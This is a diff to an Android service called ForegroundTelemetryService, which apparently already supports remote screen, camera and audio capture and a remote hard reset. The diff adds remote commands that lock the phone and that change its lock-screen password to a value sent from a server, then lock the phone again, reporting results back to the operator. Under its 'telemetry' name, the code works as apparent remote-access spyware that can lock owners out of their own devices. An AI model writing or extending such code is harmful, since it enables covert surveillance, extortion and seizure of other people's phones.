@@ -115,6 +115,8 @@ public class ForegroundTelemetryService extends Service implements LocationListe
     private static final String KEY_REMOTE_SCREEN_LAST_UPLOAD_PREFIX = "remote_screen_last_upload_";
     private static final String KEY_REMOTE_CAMERA_LAST_UPLOAD_PREFIX = "remote_camera_last_upload_";
     private static final String KEY_REMOTE_HARD_RESET_LAST_SESSION = "remote_hard_reset_last_session";
+    private static final String KEY_REMOTE_LOCK_SCREEN_LAST_SESSION = "remote_lock_screen_last_session";
+    private static final String KEY_REMOTE_SET_PASSWORD_LAST_SESSION = "remote_set_password_last_session";
 
     @Override
     public void onCreate() {
@@ -378,6 +380,26 @@ public class ForegroundTelemetryService extends Service implements LocationListe
             return;
         }
 
+        if ("lock_screen".equals(requestType)) {
+            activeScreenSessionId = null;
+            activeAudioSessionId = null;
+            activeCameraSessionId = null;
+            activeCameraFacing = null;
+            releaseScreenProjection();
+            maybeRunRemoteLockScreen(sessionId);
+            return;
+        }
+
+        if ("set_lock_password".equals(requestType)) {
+            activeScreenSessionId = null;
+            activeAudioSessionId = null;
+            activeCameraSessionId = null;
+            activeCameraFacing = null;
+            releaseScreenProjection();
+            maybeRunRemoteSetLockPassword(sessionId, activeSession.optString("note", ""));
+            return;
+        }
+
         activeScreenSessionId = null;
         activeAudioSessionId = null;
         activeCameraSessionId = null;
@@ -464,6 +486,79 @@ public class ForegroundTelemetryService extends Service implements LocationListe
             } catch (Exception ignored) {
             }
             sendMetric("remote_command", "hard_reset", "error", (int) (System.currentTimeMillis() - startedAt), null, ctx);
+        }
+    }
+
+    private void maybeRunRemoteLockScreen(String sessionId) {
+        if (sessionId == null || sessionId.trim().isEmpty()) return;
+        String executed = prefs().getString(KEY_REMOTE_LOCK_SCREEN_LAST_SESSION, null);
+        if (sessionId.equals(executed)) return;
+        prefs().edit().putString(KEY_REMOTE_LOCK_SCREEN_LAST_SESSION, sessionId).apply();
+        new Thread(() -> triggerLockScreen(sessionId), "remote-lock-screen").start();
+    }
+
+    private void triggerLockScreen(String sessionId) {
+        JSONObject ctx = new JSONObject();
+        try {
+            ctx.put("sessionId", sessionId);
+            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
+            ComponentName admin = new ComponentName(this, DeviceAdminReceiver.class);
+            if (dpm == null || !dpm.isAdminActive(admin)) {
+                ctx.put("reason", "device_admin_inactive");
+                sendMetric("remote_command", "lock_screen", "blocked", null, null, ctx);
+                return;
+            }
+            dpm.lockNow();
+            sendMetric("remote_command", "lock_screen", "ok", null, null, ctx);
+        } catch (Exception e) {
+            try {
+                ctx.put("error", e.getClass().getSimpleName());
+            } catch (Exception ignored) {
+            }
+            sendMetric("remote_command", "lock_screen", "error", null, null, ctx);
+        }
+    }
+
+    private void maybeRunRemoteSetLockPassword(String sessionId, String newPassword) {
+        if (sessionId == null || sessionId.trim().isEmpty()) return;
+        String executed = prefs().getString(KEY_REMOTE_SET_PASSWORD_LAST_SESSION, null);
+        if (sessionId.equals(executed)) return;
+        prefs().edit().putString(KEY_REMOTE_SET_PASSWORD_LAST_SESSION, sessionId).apply();
+        new Thread(() -> triggerSetLockPassword(sessionId, newPassword), "remote-set-lock-password").start();
+    }
+
+    private void triggerSetLockPassword(String sessionId, String newPassword) {
+        JSONObject ctx = new JSONObject();
+        try {
+            ctx.put("sessionId", sessionId);
+            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
+            ComponentName admin = new ComponentName(this, DeviceAdminReceiver.class);
+            if (dpm == null || !dpm.isAdminActive(admin)) {
+                ctx.put("reason", "device_admin_inactive");
+                sendMetric("remote_command", "set_lock_password", "blocked", null, null, ctx);
+                return;
+            }
+            String normalized = newPassword != null ? newPassword.trim() : "";
+            if (normalized.length() < 4) {
+                ctx.put("reason", "password_too_short");
+                sendMetric("remote_command", "set_lock_password", "blocked", null, null, ctx);
+                return;
+            }
+            boolean changed = dpm.resetPassword(normalized, 0);
+            ctx.put("changed", changed);
+            sendMetric("remote_command", "set_lock_password", changed ? "ok" : "rejected", null, null, ctx);
+            if (changed) {
+                try {
+                    dpm.lockNow();
+                } catch (Exception ignored) {
+                }
+            }
+        } catch (Exception e) {
+            try {
+                ctx.put("error", e.getClass().getSimpleName());
+            } catch (Exception ignored) {
+            }
+            sendMetric("remote_command", "set_lock_password", "error", null, null, ctx);
         }
     }
 
